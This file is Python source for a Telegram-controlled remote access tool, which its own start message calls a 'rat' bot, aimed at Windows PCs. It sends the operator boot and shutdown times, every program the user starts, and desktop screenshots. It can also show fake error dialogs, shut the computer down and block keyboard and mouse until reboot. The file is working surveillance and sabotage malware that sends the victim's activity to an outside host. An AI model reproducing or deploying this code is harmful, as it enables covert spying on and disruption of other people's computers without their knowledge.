import ctypes
import telebot
import time
import atexit
import threading
import pythoncom
import wmi
import pyautogui
import os
import pygetwindow as gw
import config
from io import BytesIO
from config import TOKEN, AUTHORIZED_ID, IGNORED_PROCESSES
from datetime import datetime
from telebot import types

IGNORED_PROCESSES = config.IGNORED_PROCESSES
TOKEN = config.TOKEN
AUTHORIZED_CHAT_ID = config.AUTHORIZED_ID
mouse_blocked = False  # Флаг, указывающий, заблокирована ли мышь
bot = telebot.TeleBot(TOKEN)

RESTART_THRESHOLD = 1  # Порог перезапуска процесса, чтобы избежать множественных уведомлений
restart_count = {}

def send_startup_message():
    start_time = datetime.now().strftime("%H:%M:%S")
    bot.send_message(AUTHORIZED_CHAT_ID, f"💻 Компьютер включен.\n⚙️ Время включения: {start_time}", reply_markup=create_keyboard())

def exit_handler():
    shutdown_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.send_message(AUTHORIZED_CHAT_ID, f"💻 Компьютер выключен.\n⚙️ Время выключения: {shutdown_time}")

def process_events():
    try:
        pythoncom.CoInitialize()
        c = wmi.WMI()
        wmi_event = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = wmi_event()
                pythoncom.PumpWaitingMessages()
                if new_process.Caption and new_process.Caption not in IGNORED_PROCESSES:
                    time.sleep(1)
                    log_application_start(new_process.Caption)
            except wmi.x_wmi_timed_out:
                pass
            time.sleep(1)
    except Exception as e:
        print(f"Exception in process_events: {e}")
    finally:
        pythoncom.CoUninitialize()

def log_application_start(application_name):
    current_time = datetime.now()
    bot.send_message(AUTHORIZED_CHAT_ID, f"🚀 Пользователь запустил приложение: {application_name}\n⚙️ Время запуска: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")

def take_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_array = BytesIO()
    screenshot.save(img_byte_array, format='PNG')
    img_byte_array.seek(0)
    return img_byte_array

def is_authorized(chat_id):
    return str(chat_id) == AUTHORIZED_CHAT_ID

def create_keyboard():
    keyboard = types.ReplyKeyboardMarkup(row_width=2)
    shutdown_button = types.KeyboardButton('💤 Выключение')
    screenshot_button = types.KeyboardButton('📸 Скриншот')
    offdevices_button = types.KeyboardButton('❌ Выключить клавиатуру и мышь (до перезагрузки)')
    keyboard.add(shutdown_button, screenshot_button, offdevices_button)
    return keyboard

@bot.message_handler(commands=['cid'])
def handle_cid(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, f"💂‍♂️ Ваш chat_id: {message.chat.id}", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.")

@bot.message_handler(commands=['error'])
def handle_error(message):
    if is_authorized(message.chat.id):
        try:
            _, error_message = message.text.split(maxsplit=1)
            ctypes.windll.user32.MessageBoxW(0, error_message, "Error", 1 | 48)
            bring_window_to_front("Error")
            bot.send_message(message.chat.id, "✅ Фейковая ошибка вызвана успешно!", reply_markup=create_keyboard())
        except ValueError:
            bot.send_message(message.chat.id, "❌ Укажите текст ошибки после команды /error.", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())

def bring_window_to_front(window_title):
    try:
        window = gw.getWindowsWithTitle(window_title)[0]
        window.activate()
    except IndexError:
        pass

@bot.message_handler(commands=['start'])
def handle_start(message):
    if is_authorized(message.chat.id):
        welcome_message = (
            "Привет! Я бот-раточка 🐀. Вот мои команды:\n\n"
            "📌 /start - выводит данный текст\n"
            "❌ /error {текст} - выводит фейковую ошибку\n"
            "🖼️ /screenshot - делает скриншот рабочего стола\n"
            "💤 /off - выключает пк\n"
            "🚷 /off_devices - выключает клавиатуру и мышь до перезагрузки пк"
        )
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())

@bot.message_handler(func=lambda message: message.text.lower() in ['/screenshot', '📸 скриншот'])
def handle_screen(message):
    if is_authorized(message.chat.id):
        try:
            screenshot = take_screenshot()
            bot.send_photo(message.chat.id, screenshot, caption="🤖 Скриншот рабочего стола:", reply_markup=create_keyboard())
        except Exception as e:
            print(f"Exception in handle_screen: {e}")
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.")

@bot.message_handler(func=lambda message: message.text.lower() in ['/off', '💤 выключение'])
def handle_off(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "💤 Выключение компьютера...", reply_markup=create_keyboard())
        time.sleep(2)
        os.system('shutdown /s /t 1')
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())

@bot.message_handler(func=lambda message: message.text.lower() in ['/off_devices', '❌ выключить клавиатуру и мышь (до перезагрузки)'])
def handle_block_devices(message):
    if is_authorized(message.chat.id):
        ctypes.windll.user32.BlockInput(True)
        bot.send_message(message.chat.id, "💤 Ввод заблокирован (мышь и клавиатура). Для разблокировки выполните перезагрузку компьютера.", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())


if __name__ == "__main__":
    send_startup_message_thread = threading.Thread(target=send_startup_message, daemon=True)
    send_startup_message_thread.start()

    process_events_thread = threading.Thread(target=process_events, daemon=True)
    process_events_thread.start()

    bot.polling(none_stop=True)
    atexit.register(exit_handler)
